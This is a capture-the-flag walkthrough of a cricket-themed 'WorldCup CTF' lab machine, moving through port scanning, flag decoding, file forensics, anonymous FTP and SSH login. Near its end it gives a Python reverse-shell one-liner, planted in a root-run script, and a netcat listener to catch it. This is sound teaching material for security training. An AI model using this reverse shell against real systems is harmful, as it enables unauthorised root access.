---
title: WorldCupCTF
permalink: worldcupctf
---
# WorldCup CTF Walkthrough
## Open Ports:
```
nmap -T4 -A $IP
```
* 21 - **ftp**
* 22 - **ssh**
* 80 - **http**

## Enumeration
### Port 80(*http*):
* In source of home page found 2 flags:
	* flag1/1{VElNRVRPUkVXSU5ELTIwMDdXT1JMRENVUF}
	* flag1/2{8wMDExMDAxMCAwMDExMTAwMSAwMDEwMTExMA==}
* On combinig the **TEXT** of both the flags i.e. *flag1/1 & flag1/2*
```
VElNRVRPUkVXSU5ELTIwMDdXT1JMRENVUF8wMDExMDAxMCAwMDExMTAwMSAwMDEwMTExMA==
```
* we get a **Base64** encoded text which on decoding :
	* **TIMETOREWIND-2007WORLDCUP_00110010 00111001 00101110**
* Taking the "2007worldcup.html" adding to the **URL**
* Looking at the **Source** of the new page we get:
	* flag2{uggcf://jjj.lbhghor.pbz/jngpu?i=55wULbbFtZb(00111000 00110101 00110000)}
* The **TEXT** of flag2 looks like encoded with *ROT13* so on decoding we get:
	* https://www.youtube.com/watch?v=55jHYooSgMo
* On directory bruteforcing we find:
	* 2 main files are found **2007.exe & 2007.txt** 
	* For *2007.exe* first we need to change the extension to *.pdf*
	* Using peepdf tool we can get our flag.
	```
	python peedpf.py -fil 2007.pdf
	extract js > flag3.pdf
	cat flag.pdf
	```
	* Inside the flag.pdf file we get : flag3{my world ashes to ashes good time bad time - 00110010 01010011 00100000}
	* for txt file **"2007.txt"** inside directory y/u/v/r/a/j
	 * It contains hints to some file named **712** which has the communication between the players.
* Now adding /712.pcapng to the **URL**
	* a *pcap* file is downloaded.
* Open the **712.pcapng** file in **WireShark**
	* filter the http protocol
	* follow HTTP stream and then download the **dhoni.jpg** form the panel.
* Look at the *metadata* of the jpg file
```
 exiftool dhoni.jpg
```
* We get the first  half of the flag : flag4{cGFzc3dvcmRfY29uc2lzdF9vZl90d29fd29yZHNfc2Vjb25kd29yZ
* Now looking at the *hexvalue* of the file
```
hexeditor dhoni.jpg
```
* At the bottom we get the second half of the flag: F9pc19NU0RIT05JX2ZpbmQtMXN0PyAwMDExMDAxMSAwMDExMDAwMSAwMDEwMTExMA==}


### Port 21(*FTP*)
* found Anonymoous login in **FTP**
	* found *zip* file name  **treasure.zip** *(passwd protected)*(
			* Using *flag3 & on decoding(Base64) flag4* we the hints for the zip file's passowrd : **andrewflintoffmsdhoni**
	* *flag.txt.txt* is extracted 
	* This has the text encoded on **BrainFuck**
	* On decoding we get flag5{seventh bowler to take 500 wickets in Test cricket knows about ...ssssssssshhhh 00110000 00110010 00110111 }

### Port 22(*SSH*)
* Every flag has some binary text at its end.
* On combinig all the binary together 
```
00110010 00111001 00101110 00111000 00110101 00110000 00110010 01010011 00100000 00110011 00110001 00101110 00110000 00110010 00110111
```
* Decoding the binary to ASCII we get some co-ordinates : **----------**
	* Search in google for the location 
		* we find the stadium **"kingsmead"** (passwd)
* Using the hint form **flag5** *{seventh bowler to take 500 wickets in Test cricket knows about}* 
	* On google serach we find **stuartbroad** (username)
* login into ssh
```
ssh stuartbroad@$IP
```
* Inside ssh we find a hidden file named *.helloWorld.sh* 
	* Inside the bash script we find a command *whoami* executed and written to /Desktop/Users.txt
* On read the Users.txt file
```
cat Desktop/Users.txt
```
* We see root by which we understand that the file is being execuated by **root**
* Adding a one liner reverse shell to the script
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
* Open a netcat session on your host device.
```
nc -lvnp 1234
```
* Wait for a minute.....
* Now in the netcat session you are the root user which has the finalfalg:

#### flag6{A trophy carries dust.Memories last forever}
